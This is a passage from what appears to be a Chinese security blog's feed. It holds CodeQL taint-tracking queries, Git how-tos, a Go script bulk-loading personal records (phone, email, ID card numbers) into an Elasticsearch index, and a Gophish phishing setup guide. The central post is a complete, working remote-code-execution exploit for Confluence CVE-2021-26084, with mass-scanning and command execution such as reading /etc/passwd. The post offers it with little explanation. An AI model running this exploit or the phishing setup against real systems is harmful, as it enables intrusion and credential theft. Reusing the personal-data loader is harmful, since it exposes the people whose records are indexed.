this.getQualifiedName().matches(&quot;%JndiLocatorDelegate&quot;)</span><br><span class="line">    or</span><br><span class="line">    this.getQualifiedName().matches(&quot;%JndiTemplate&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Logger extends RefType &#123;</span><br><span class="line">  Logger() &#123; this.hasQualifiedName(&quot;org.apache.logging.log4j.spi&quot;, &quot;AbstractLogger&quot;) &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class LoggerInput extends Method &#123;</span><br><span class="line">  LoggerInput() &#123;</span><br><span class="line">    this.getDeclaringType() instanceof Logger and</span><br><span class="line">    this.hasName(&quot;error&quot;) and</span><br><span class="line">    this.getNumberOfParameters() = 1</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Parameter getAnUntrustedParameter() &#123; result = this.getParameter(0) &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate isLookup(Expr arg) &#123;</span><br><span class="line">  exists(MethodAccess ma |</span><br><span class="line">    ma.getMethod().getName() = &quot;lookup&quot; and</span><br><span class="line">    ma.getMethod().getDeclaringType() instanceof Context and</span><br><span class="line">    arg = ma.getArgument(0)</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TainttrackLookup extends TaintTracking::Configuration &#123;</span><br><span class="line">  TainttrackLookup() &#123; this = &quot;TainttrackLookup&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    exists(LoggerInput LoggerMethod | source.asParameter() = LoggerMethod.getAnUntrustedParameter())</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isAdditionalTaintStep(DataFlow::Node fromNode, DataFlow::Node toNode) &#123;</span><br><span class="line">    exists(MethodAccess ma, MethodAccess ma2 |</span><br><span class="line">      ma.getMethod()</span><br><span class="line">          .getDeclaringType()</span><br><span class="line">          .hasQualifiedName(&quot;org.apache.logging.log4j.core.impl&quot;, &quot;ReusableLogEventFactory&quot;) and</span><br><span class="line">      ma.getMethod().hasName(&quot;createEvent&quot;) and</span><br><span class="line">      fromNode.asExpr() = ma.getArgument(5) and</span><br><span class="line">      ma2.getMethod()</span><br><span class="line">          .getDeclaringType()</span><br><span class="line">          .hasQualifiedName(&quot;org.apache.logging.log4j.core.config&quot;, &quot;LoggerConfig&quot;) and</span><br><span class="line">      ma2.getMethod().hasName(&quot;log&quot;) and</span><br><span class="line">      ma2.getMethod().getNumberOfParameters() = 2 and</span><br><span class="line">      toNode.asExpr() = ma2.getArgument(0)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(Expr arg |</span><br><span class="line">      isLookup(arg) and</span><br><span class="line">      sink.asExpr() = arg</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from TainttrackLookup config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, &quot;unsafe lookup&quot;, source.getNode(), &quot;this is user input&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>规则界面右击-&gt;CodeQL:Run Query<br><img src="/images/blog/3e4be458aa87d543ba5ee1760d487f32.png"><br>运行完了后会显示结果在右边窗口。查看即可。<br><img src="/images/blog/881eb13e80135da4fd52fbaa386c000d.png"></p>
]]></content>
      <tags>
        <tag>codeql</tag>
      </tags>
  </entry>
  <entry>
    <title>Confluence Servers-CVE-2021-26084</title>
    <url>/2024/09/10/Confluence-Servers-CVE-2021-26084/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">@File    :   PoC.py</span><br><span class="line">@Time    :   2021/09/01 14:16:26</span><br><span class="line">@Author  :   _0xf4n9x_</span><br><span class="line">@Version :   1.0</span><br><span class="line">@Contact :   fanq.xu@gmail.com</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import urllib3</span><br><span class="line">import argparse</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">proxy = &#123;</span><br><span class="line">    &#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;,</span><br><span class="line">    &#x27;https&#x27;: &#x27;http://127.0.0.1:8080&#x27;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def usage():</span><br><span class="line">    print(&quot;Eg: \n    python3 PoC.py -u http://127.0.0.1&quot;)</span><br><span class="line">    print(&quot;    python3 PoC.py -u httts://127.0.0.1 -e &#x27;cat /etc/passwd&#x27;&quot;)</span><br><span class="line">    print(&quot;    python3 PoC.py -f urls.txt&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def poc(host):</span><br><span class="line">    paths = [&#x27;/pages/createpage-entervariables.action?SpaceKey=x&#x27;, &#x27;/pages/createpage-entervariables.action&#x27;, &#x27;/confluence/pages/createpage-entervariables.action?SpaceKey=x&#x27;, &#x27;/confluence/pages/createpage-entervariables.action&#x27;, &#x27;/wiki/pages/createpage-entervariables.action?SpaceKey=x&#x27;, &#x27;/wiki/pages/createpage-entervariables.action&#x27;, &#x27;/pages/doenterpagevariables.action&#x27;, &#x27;/pages/createpage.action?spaceKey=myproj&#x27;, &#x27;/pages/templates2/viewpagetemplate.action&#x27;, &#x27;/pages/createpage-entervariables.action&#x27;, &#x27;/template/custom/content-editor&#x27;, &#x27;/templates/editor-preload-container&#x27;, &#x27;/users/user-dark-features&#x27;]</span><br><span class="line">    for path in paths:</span><br><span class="line">        url = host + path</span><br><span class="line">        headers = &#123;</span><br><span class="line">            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1&quot;,</span><br><span class="line">            &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125;</span><br><span class="line">        num1 = random.randint(100, 10000)</span><br><span class="line">        num2 = random.randint(100, 10000)</span><br><span class="line">        sum = num1 * num2</span><br><span class="line">        params = &#123;</span><br><span class="line">        &quot;queryString&quot;: &quot;aaaa\\u0027+&#123;&quot; + str(num1) + &quot;*&quot; + str(num2) + &quot;&#125;+\\u0027bbb&quot;&#125;</span><br><span class="line">        try:</span><br><span class="line">            res = requests.post(url, headers=headers, data=params,</span><br><span class="line">                                timeout=6, verify=False, proxies=None)</span><br><span class="line">            if str(sum) in res.text:</span><br><span class="line">                print(&quot;[+] &quot; + host + path + &quot; is vulnerable!&quot;)</span><br><span class="line">                return path</span><br><span class="line">            else:</span><br><span class="line">                continue</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">    print(&quot;[-] &quot; + host + &quot; is not vulnerable!&quot;)</span><br><span class="line">    return 0</span><br><span class="line"></span><br><span class="line">def exp(host, command, path):</span><br><span class="line">    url = host + path</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125;</span><br><span class="line">    params = &#123;</span><br><span class="line">        &quot;queryString&quot;: &quot;aaaaaaaa\\u0027+&#123;Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022&quot; + command + &quot;\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin)&#123;p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); &#125; else&#123;p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); &#125;p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null)&#123;output = output + line + java.lang.Character.toString(10); &#125;\\u0027)&#125;+\\u0027&quot;&#125;</span><br><span class="line"></span><br><span class="line">    res = requests.post(url, headers=headers, data=params,</span><br><span class="line">                        timeout=6, verify=False, proxies=None).text</span><br><span class="line">    soup = BeautifulSoup(res, &quot;html5lib&quot;)</span><br><span class="line">    # content = soup.find(method=&quot;POST&quot;).find_all(&#x27;input&#x27;)[1][&quot;value&quot;]</span><br><span class="line">    content = soup.find(&#x27;input&#x27;, attrs=&#123;&#x27;name&#x27;: &#x27;queryString&#x27;, &#x27;type&#x27;: &#x27;hidden&#x27;&#125;)[</span><br><span class="line">        &#x27;value&#x27;]</span><br><span class="line"></span><br><span class="line">    print(content.replace(&#x27;aaaaaaaa[&#x27;, &#x27;&#x27;).replace(&#x27;\n]&#x27;, &#x27;&#x27;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=&quot;CVE-2021-26084 Remote Code Execution on Confluence Servers&quot;)</span><br><span class="line">    parser.add_argument(&#x27;-u&#x27;, &#x27;--url&#x27;, type=str,</span><br><span class="line">                        help=&quot;vulnerability verification for individual websites&quot;)</span><br><span class="line">    parser.add_argument(&#x27;-e&#x27;, &#x27;--exec&#x27;, type=str,</span><br><span class="line">                        help=&quot;command execution&quot;)</span><br><span class="line">    parser.add_argument(&#x27;-f&#x27;, &#x27;--file&#x27;, type=str,</span><br><span class="line">                        help=&quot;perform vulnerability checks on multiple websites in a file, and the vulnerable websites will be output to the success.txt file&quot;)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    if len(sys.argv) == 3:</span><br><span class="line">        if sys.argv[1] in [&#x27;-u&#x27;, &#x27;--url&#x27;]:</span><br><span class="line">            poc(args.url)</span><br><span class="line">        elif sys.argv[1] in [&#x27;-f&#x27;, &#x27;--file&#x27;]:</span><br><span class="line">            if os.path.isfile(args.file) == True:</span><br><span class="line">                with open(args.file) as target:</span><br><span class="line">                    hosts = []</span><br><span class="line">                    hosts = target.read().splitlines()</span><br><span class="line">                    for host in hosts:</span><br><span class="line">                        if poc(host) != 0:</span><br><span class="line">                            with open(&quot;success.txt&quot;, &quot;a+&quot;) as f:</span><br><span class="line">                                f.write(host + &quot;\n&quot;)</span><br><span class="line">    elif len(sys.argv) == 5:</span><br><span class="line">        if set([sys.argv[1], sys.argv[3]]) &lt; set([&#x27;-u&#x27;, &#x27;--url&#x27;, &#x27;-e&#x27;, &#x27;--exec&#x27;]):</span><br><span class="line">            path = poc(args.url)</span><br><span class="line">            if path != 0:</span><br><span class="line">                exp(args.url, args.exec, path)</span><br><span class="line">    else:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        usage()</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/0xf4n9x/CVE-2021-26084/blob/main/PoC.py">https://github.com/0xf4n9x/CVE-2021-26084/blob/main/PoC.py</a><br><a href="https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md">https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md</a></p>
]]></content>
      <tags>
        <tag>poc</tag>
      </tags>
  </entry>
  <entry>
    <title>Git合并分支操作</title>
    <url>/2024/09/10/Git%E5%90%88%E5%B9%B6%E5%88%86%E6%94%AF%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>开发分支：</p>
<ul>
<li>dev</li>
</ul>
<p>主分支：</p>
<ul>
<li>master</li>
</ul>
<p>先更新代码到待合并的分支</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &#x27;dev&#x27;</span><br><span class="line">git push -u origin dev</span><br></pre></td></tr></table></figure>
<p>然后我们要把dev分支的代码合并到master分支上</p>
<p>首先切换到master分支上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git checkout master</span><br></pre></td></tr></table></figure>
<p>如果是多人开发的话 需要把远程master上的代码pull下来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git pull origin master</span><br></pre></td></tr></table></figure>
<p>如果是自己一个开发就没有必要了，为了保险期间还是pull</p>
<p>然后我们把dev分支的代码合并到master上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git merge dev</span><br></pre></td></tr></table></figure>
<p>然后查看状态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure>
<blockquote>
<p>On branch master<br>Your branch is ahead of ‘origin&#x2F;master’ by 12 commits.<br>(use “git push” to publish your local commits)<br>nothing to commit, working tree clean</p>
</blockquote>
<p>上面的意思就是你有12个commit，需要push到远程master上<br>执行下面命令即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>Codeql-全局污点追踪</title>
    <url>/2024/09/10/Codeql-%E5%85%A8%E5%B1%80%E6%B1%A1%E7%82%B9%E8%BF%BD%E8%B8%AA/</url>
    <content><![CDATA[<h3 id="全局污点追踪"><a href="#全局污点追踪" class="headerlink" title="全局污点追踪"></a>全局污点追踪</h3><p>与局部污点追踪类似，全局污点追踪针对的是全局数据流。全局污点追踪通过其他不保留值的步骤来扩展了全局数据流。</p>
<p>通过继承<strong>TaintTracking::Configuration</strong>类以使用全局污点追踪的库函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line">class MyTaintTrackingConfiguration extends TaintTracking::Configuration &#123;</span><br><span class="line">  MyTaintTrackingConfiguration() &#123; this = &quot;MyTaintTrackingConfiguration&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在配置中定义了以下谓词：</p>
<blockquote>
<p>isSource：定义污点可能从何处流出<br>isSink：定义污点可能流入的地方<br>isSanitizer：可选，限制污点流<br>isSanitizerGuard：可选，限制污点流<br>isAdditionalTaintStep：可选，添加其他污染步骤<br>使用谓词hasFlow(DataFlow::Node source, DataFlow::Node sink)以执行污点追踪分析。</p>
</blockquote>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>以下数据流分析用于追踪从环境变量到打开文件的数据流</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">class EnvironmentToFileConfiguration extends DataFlow::Configuration &#123;</span><br><span class="line">  EnvironmentToFileConfiguration() &#123; this = &quot;EnvironmentToFileConfiguration&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    exists (Function getenv |</span><br><span class="line">      source.asExpr().(FunctionCall).getTarget() = getenv and</span><br><span class="line">      getenv.hasQualifiedName(&quot;getenv&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists (FunctionCall fc |</span><br><span class="line">      sink.asExpr() = fc.getArgument(0) and</span><br><span class="line">      fc.getTarget().hasQualifiedName(&quot;fopen&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Expr getenv, Expr fopen, EnvironmentToFileConfiguration config</span><br><span class="line">where config.hasFlow(DataFlow::exprNode(getenv), DataFlow::exprNode(fopen))</span><br><span class="line">select fopen, &quot;This &#x27;fopen&#x27; uses data from $@.&quot;,</span><br><span class="line">  getenv, &quot;call to &#x27;getenv&#x27;&quot;</span><br></pre></td></tr></table></figure>
<p>以下污点追踪代码用于追踪从调用ntohl到操作数组索引的数据流。该代码使用Guards库以识别经过边界检查的表达式，同时还定义了谓词isSanitizer以避免污点分析经过特定数据，最后定义了isAdditionalTaintStep用于将流从边界循环添加至循环索引。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.controlflow.Guards</span><br><span class="line">import semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line">class NetworkToBufferSizeConfiguration extends TaintTracking::Configuration &#123;</span><br><span class="line">  NetworkToBufferSizeConfiguration() &#123; this = &quot;NetworkToBufferSizeConfiguration&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node node) &#123;</span><br><span class="line">    node.asExpr().(FunctionCall).getTarget().hasGlobalName(&quot;ntohl&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node node) &#123;</span><br><span class="line">    exists(ArrayExpr ae | node.asExpr() = ae.getArrayOffset())</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isAdditionalTaintStep(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    exists(Loop loop, LoopCounter lc |</span><br><span class="line">      loop = lc.getALoop() and</span><br><span class="line">      loop.getControllingExpr().(RelationalOperation).getGreaterOperand() = pred.asExpr() |</span><br><span class="line">      succ.asExpr() = lc.getVariableAccessInLoop(loop)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    exists(GuardCondition gc, Variable v |</span><br><span class="line">      gc.getAChild*() = v.getAnAccess() and</span><br><span class="line">      node.asExpr() = v.getAnAccess() and</span><br><span class="line">      gc.controls(node.asExpr().getBasicBlock(), _)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from DataFlow::Node ntohl, DataFlow::Node offset, NetworkToBufferSizeConfiguration conf</span><br><span class="line">where conf.hasFlow(ntohl, offset)</span><br><span class="line">select offset, &quot;This array offset may be influenced by $@.&quot;, ntohl,</span><br><span class="line">  &quot;converted data from the network&quot;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>codeql</tag>
      </tags>
  </entry>
  <entry>
    <title>Git新建TAG</title>
    <url>/2024/09/10/Git%E6%96%B0%E5%BB%BATAG/</url>
    <content><![CDATA[<p>查看tag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F:\project\code\&gt;git tag</span><br><span class="line">1.0</span><br><span class="line">v0.0.2</span><br><span class="line">v0.0.3</span><br><span class="line">v2.0</span><br></pre></td></tr></table></figure>

<p>新建tag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git tag v2.1</span><br></pre></td></tr></table></figure>

<p>push代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git push origin v2.1</span><br></pre></td></tr></table></figure>

<p>删除本地tag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git tag -d v20190514</span><br></pre></td></tr></table></figure>

<p>删除远程tag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git push origin :refs/tags/v20190514</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>Golang操作es操作数据库</title>
    <url>/2024/09/10/Golang%E6%93%8D%E4%BD%9Ces%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<p>批量导入数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;bufio&quot;</span><br><span class="line">	&quot;context&quot;</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;github.com/olivere/elastic&quot;</span><br><span class="line">	&quot;log&quot;</span><br><span class="line">	&quot;os&quot;</span><br><span class="line">	&quot;strings&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type ReqData struct &#123;</span><br><span class="line">	Id       string `json:&quot;id&quot;`</span><br><span class="line">	Phone    string `json:&quot;phone&quot;`</span><br><span class="line">	Email    string `json:&quot;email&quot;`</span><br><span class="line">	Username string `json:&quot;username&quot;`</span><br><span class="line">	Name     string `json:&quot;name&quot;`</span><br><span class="line">	CardNo   string `json:&quot;cardno&quot;`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var esclient *elastic.Client</span><br><span class="line"></span><br><span class="line">var host = &quot;http://127.0.0.1:9200&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line"></span><br><span class="line">	errorlog := log.New(os.Stdout, &quot;app&quot;, log.LstdFlags)</span><br><span class="line"></span><br><span class="line">	var err error</span><br><span class="line">	esclient, err := elastic.NewClient(elastic.SetErrorLog(errorlog), elastic.SetURL(host), elastic.SetSniff(false))</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	info, code, err := esclient.Ping(host).Do(context.Background())</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(&quot;Es return with code %d and version %s \n&quot;, code, info.Version.Number)</span><br><span class="line">	esversionCode, err := esclient.ElasticsearchVersion(host)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		panic(err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(&quot;es version %s\n&quot;, esversionCode)</span><br><span class="line"></span><br><span class="line">	//put, err := esclient.Index().Index(&quot;customer&quot;).Type(&quot;_doc&quot;).Id(&quot;6&quot;).BodyJson(e1).Do(context.Background())</span><br><span class="line">	//if err != nil &#123;</span><br><span class="line">	//	panic(err)</span><br><span class="line">	//&#125;</span><br><span class="line">	//fmt.Printf(&quot;indexed %d to index %s, type %s \n&quot;, put.Id, put.Index, put.Type)</span><br><span class="line">	builServe := esclient.Bulk().Index(&quot;sgk&quot;)</span><br><span class="line">	fp, err := os.OpenFile(&quot;C:\\Users\\Administrator\\Desktop\\user.csv&quot;, os.O_RDONLY, 0777)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	var data = ReqData&#123;&#125;</span><br><span class="line">	scanner := bufio.NewScanner(fp)</span><br><span class="line">	for scanner.Scan() &#123;</span><br><span class="line"></span><br><span class="line">		line := scanner.Text()</span><br><span class="line">		tmpdata := strings.Split(line, &quot;,&quot;)</span><br><span class="line">		data.Id = tmpdata[0]</span><br><span class="line">		data.Phone = tmpdata[1]</span><br><span class="line">		data.Email = tmpdata[2]</span><br><span class="line">		data.Username = tmpdata[3]</span><br><span class="line">		data.Name = tmpdata[4]</span><br><span class="line">		data.CardNo = tmpdata[6]</span><br><span class="line"></span><br><span class="line">		doc := elastic.NewBulkIndexRequest().Id(data.Id).Doc(data)</span><br><span class="line">		builServe.Add(doc)</span><br><span class="line">	&#125;</span><br><span class="line">	resp, err := builServe.Do(context.Background())</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Println(resp.Took)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>golang</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Gophish安装与使用</title>
    <url>/2024/09/10/Gophish%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<blockquote>
<p>邮件服务器搭建请看另一篇:<a href="http://42.193.253.66:3000/shareview?key=7ac61948c55d9dd575953a0b8f07849b">邮件服务器搭建</a></p>
</blockquote>
<h3 id="0x1-下载"><a href="#0x1-下载" class="headerlink" title="0x1 下载"></a>0x1 下载</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/gophish/gophish</span><br><span class="line">https://github.com/gophish/gophish/releases/download/v0.11.0/gophish-v0.11.0-linux-64bit.zip</span><br></pre></td></tr></table></figure>


<h3 id="0x2-安装"><a href="#0x2-安装" class="headerlink" title="0x2 安装"></a>0x2 安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# wget https://github.com/gophish/gophish/releases/download/v0.11.0/gophish-v0.11.0-linux-64bit.zip</span><br><span class="line">[root@localhost ~]# unzip gophish-v0.11.0-linux-64bit.zip</span><br></pre></td></tr></table></figure>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>监听设置为0.0.0.0意思是监听本机中所有IP的端口，127.0.0.1只能本机访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        &quot;admin_server&quot;: &#123;</span><br><span class="line">                &quot;listen_url&quot;: &quot;0.0.0.0:443&quot;,</span><br><span class="line">                &quot;use_tls&quot;: true,</span><br><span class="line">                &quot;cert_path&quot;: &quot;gophish_admin.crt&quot;,</span><br><span class="line">                &quot;key_path&quot;: &quot;gophish_admin.key&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;phish_server&quot;: &#123;</span><br><span class="line">                &quot;listen_url&quot;: &quot;0.0.0.0:80&quot;,</span><br><span class="line">                &quot;use_tls&quot;: false,</span><br><span class="line">                &quot;cert_path&quot;: &quot;example.crt&quot;,</span><br><span class="line">                &quot;key_path&quot;: &quot;example.key&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;db_name&quot;: &quot;sqlite3&quot;,</span><br><span class="line">        &quot;db_path&quot;: &quot;gophish.db&quot;,</span><br><span class="line">        &quot;migrations_prefix&quot;: &quot;db/db_&quot;,</span><br><span class="line">        &quot;contact_address&quot;: &quot;&quot;,</span><br><span class="line">        &quot;logging&quot;: &#123;</span><br><span class="line">                &quot;filename&quot;: &quot;&quot;,</span><br><span class="line">                &quot;level&quot;: &quot;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p> listen_url为后续放到钓鱼邮件里的链接</p>
</blockquote>
<p>更新gophish权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhsot gophish]# chmod +x gophish</span><br></pre></td></tr></table></figure>

<h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nohup ./gophish &amp;</span><br></pre></td></tr></table></figure>

<h3 id="0x3-功能介绍"><a href="#0x3-功能介绍" class="headerlink" title="0x3 功能介绍"></a>0x3 功能介绍</h3><h4 id="功能界面"><a href="#功能界面" class="headerlink" title="功能界面"></a>功能界面</h4><p><img src="/images/blog/d39cccba83cdbe01f572336751cebbd8.png"></p>
<h4 id="菜单说明"><a href="#菜单说明" class="headerlink" title="菜单说明"></a>菜单说明</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sending Profiles        发件策略</span><br><span class="line">Campaigns               工作面板</span><br><span class="line">Users &amp; Groups          用户配置--配置收件人</span><br><span class="line">Email Templates         邮件模板--邮件内容设置</span><br><span class="line">Landing Pages           钓鱼页面</span><br><span class="line">Sending Profiles        邮箱发件配置</span><br><span class="line">Account Settings        账户设置</span><br><span class="line">User ManagementAdmin    用户设置--配置后台可登录的用户</span><br><span class="line">WebhooksAdmin           个人暂时不涉及</span><br><span class="line">User Guide</span><br></pre></td></tr></table></figure>

<h3 id="0x4-实战"><a href="#0x4-实战" class="headerlink" title="0x4 实战"></a>0x4 实战</h3><h4 id="发送人信息配置"><a href="#发送人信息配置" class="headerlink" title="发送人信息配置"></a>发送人信息配置</h4><p><img src="/images/blog/4bee75798455f7e6727590b18fba1392.png"></p>
<blockquote>
<p>1.因为我的邮件服务器和gophish是放在一台服务器，所以Host填的localhost:25<br>2.Email Headers 可以自定义，默认的话会带有gophish的关键字,可添加【X-Mailer】更改默认值</p>
</blockquote>
<h4 id="邮件模板配置【Sending-Profiles】"><a href="#邮件模板配置【Sending-Profiles】" class="headerlink" title="邮件模板配置【Sending Profiles】"></a>邮件模板配置【Sending Profiles】</h4><blockquote>
<p>邮件模板请参考另一篇</p>
</blockquote>
<blockquote>
<p>注意其中的  .URL  参数，这是一个占位符，邮件实际发出后，会插入钓鱼的链接</p>
</blockquote>
<h4 id="收件人配置"><a href="#收件人配置" class="headerlink" title="收件人配置"></a>收件人配置</h4><p>可批量添加【<strong>Bulk Import Users</strong>】，<strong>first name</strong> 和 <strong>Last name</strong>可不填，不影响，在<strong>Email</strong>填入收件人的邮箱即可，好了之后点击【Add】<br><img src="/images/blog/b51c59e575cbfd6803ae70a74332b78b.png"></p>
<h4 id="钓鱼页面配置"><a href="#钓鱼页面配置" class="headerlink" title="钓鱼页面配置"></a>钓鱼页面配置</h4><p><img src="/images/blog/226e6057092e1590a2b659308a46d14a.png"></p>
